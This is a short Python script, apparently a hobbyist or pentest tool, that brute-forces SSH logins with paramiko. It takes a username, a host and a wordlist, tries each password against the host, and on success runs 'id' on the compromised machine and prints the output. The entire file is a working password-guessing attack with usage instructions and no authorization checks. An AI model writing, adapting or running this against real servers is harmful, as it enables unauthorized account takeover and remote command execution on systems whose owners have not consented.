#!/usr/bin/python3

from paramiko import SSHClient
import paramiko, sys

if len(sys.argv) < 4:
    print ('How to use')
    print ('python3 {} [USER] [HOST] [WORDLIST]'.format(sys.argv[0]))
    exit()

pa = open(sys.argv[3],'r')
host = sys.argv[2]
user = sys.argv[1]

for p in pa.readlines():
    try:
        passwordd = p.strip()
        print('Testing: ' + passwordd)
        ssh = SSHClient()
        ssh.load_system_host_keys()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname=host,username=user,password=passwordd)
        stdin,stdout,stderr = ssh.exec_command('id')
        
        print(stdout.readlines())
        exit()
    except:
        pass
